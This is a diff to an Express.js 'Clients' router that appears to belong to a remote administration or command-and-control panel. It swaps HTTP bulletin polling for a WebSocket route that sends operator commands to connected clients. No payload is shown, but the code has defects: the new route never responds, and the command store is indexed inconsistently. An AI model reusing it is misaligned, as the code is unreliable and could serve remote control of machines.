@@ -1,12 +1,13 @@
 var router = require('express').Router(),
     auth = require('../auth'),
-    Client = require('mongoose').model('Client')
+    Client = require('mongoose').model('Client'),
+    wss = require('../../wss')
 
 function log(msg) {
     console.log(`[*] Clients: ${msg}`)
 }
 
-var commands = {}
+var commands = []
 var id = 0
 
 function validId(req, res, next) {
@@ -21,6 +22,10 @@ function validId(req, res, next) {
         }
     })
 }
+
+wss.on('respond', (ws, args) => {
+    commands.splice(args.id, 1)
+})
 
 router.get('/clients', auth.user, (req, res, next) => {
     Client.find({ }, (err, clients) => {
@@ -63,12 +68,12 @@ router.get('/clients/:id', auth.user, validId, (req, res) => {
     res.render('clients/client.html', { _client: req.client, commands: commands[req.client.id] })
 })
 
-router.post('/clients/:id/editInfo', auth.user, validId, (req, res) => {
+router.post('/clients/:id/editInfo', auth.user, validId, (req, res, next) => {
     Client.findByIdAndUpdate(req.client.id, {
         name: req.body.name,
         note: req.body.note
     }, err => {
-        if (err) return next(err) 
+        if (err) return next(err)
         if (req.body.name) {
             log(`${req.client.id}: Name and note modified`)
             res.render('clients/client.html', {
@@ -101,23 +106,11 @@ router.get('/clients/:id/disconnect', (req, res) => {
     })
 })
 
-router.get('/clients/:id/bulletin', validId, (req, res) => {
-    res.json(commands[req.client.id])
-})
-
-router.post('/clients/:id/bulletin', auth.user, validId, (req, res) => {
-    var data = JSON.parse(req.body.data)
-    if (data.code) {
-        log(`${req.client.id}: Command posted`)
-        commands[req.client.id].push({
-            id: id++,
-            code: data.code,
-            args: data.args
-        })
-        res.sendStatus(200)
-    } else {
-        res.sendStatus(400)
-    }
+router.post('/clients/:id/do', auth.user, validId, (req, res) => {
+    var args = req.body.args
+    args.id = id++
+    wss.do(req.body.type, args)
+    log(`${req.client.id}: Command sent`)
 })
 
 router.post('/clients/:id/bulletin/respond', validId, (req, res) => {
